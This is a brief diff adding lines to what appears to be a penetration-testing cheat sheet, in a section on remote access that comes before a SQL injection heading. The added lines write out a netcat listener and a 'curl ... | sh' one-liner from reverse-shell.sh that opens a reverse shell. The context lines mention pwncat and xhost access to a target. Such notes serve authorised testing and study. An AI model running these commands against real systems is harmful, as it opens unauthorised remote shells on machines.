@@ -410,6 +410,10 @@
 			Xnest :1
 			xhost +targetip
 	
+	https://reverse-shell.sh/
+		nc -l 1337
+		curl https://reverse-shell.sh/yourip:1337 | sh
+		
 	https://github.com/calebstewart/pwncat
 
 ### SQLi (SQL Injection)
